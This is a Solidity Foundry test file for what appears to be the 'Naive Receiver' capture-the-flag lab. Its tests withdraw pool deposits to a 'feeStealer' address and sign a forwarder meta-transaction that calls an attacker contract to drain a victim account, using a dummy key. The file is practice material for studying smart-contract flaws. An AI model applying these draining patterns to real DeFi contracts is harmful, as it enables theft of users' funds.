// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {console2} from "forge-std/Test.sol";

import {UtilsTest} from "./Utils.t.sol";
import {BasicForwarder} from "../src/BasicForwarder.sol";
import {NaiveReceiverPool} from "../src/NaiveReceiverPool.sol";

contract NaiveReceiverPoolTest is UtilsTest {
    function setUp() public override {
        UtilsTest.setUp();
    }

    function testWithDraw() public {
        console2.log(
            "pool balance  before:",
            weth.balanceOf(address(naivePool))
        );

        naivePool.withdraw(
            naivePool.totalDeposits(),
            payable(address(feeStealer))
        );

        console2.log("fee stealer :", weth.balanceOf(feeStealer));
        console2.log("pool balance after:", weth.balanceOf(address(naivePool)));
    }

    function testFlashLoan() public {
        vm.startPrank(address(flashLoanReceiver));
        naivePool.flashLoan(flashLoanReceiver, address(weth), 10, "");
        vm.stopPrank();
    }
    function testDrainUserFunds() public {
        // 1. Using dmmay key
        uint256 privateKey = 0xA11CE;
        address signer = vm.addr(privateKey);

        // 2. Build calldata
        bytes memory callData = abi.encodeWithSignature("attack()");

        // 3. Build the request
        BasicForwarder.Request memory req = BasicForwarder.Request({
            from: signer,
            target: address(attacker),
            value: 0,
            gas: 100_000,
            nonce: basicForwarder.nonces(signer),
            data: callData,
            deadline: block.timestamp + 1 hours
        });

        // 4. Hash the struct using EIP712
        bytes32 typeHash = basicForwarder.getRequestTypehash();
        bytes32 structHash = keccak256(
            abi.encode(
                typeHash,
                req.from,
                req.target,
                req.value,
                req.gas,
                req.nonce,
                keccak256(req.data),
                req.deadline
            )
        );

        // 5. EIP712 Digest
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                basicForwarder.domainSeparator(),
                structHash
            )
        );

        // 6. Sign with victim’s private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // 7. Simulate call to forwarder
        vm.prank(makeAddr("relayer"));
        basicForwarder.execute(req, signature);

        console2.log("Signature accepted and forwarded to:", req.target);
        assertEq(weth.balanceOf(signer), 0, "Victim should be drained");
        console2.log("Pool WETH balance:", weth.balanceOf(address(naivePool)));
    }
}
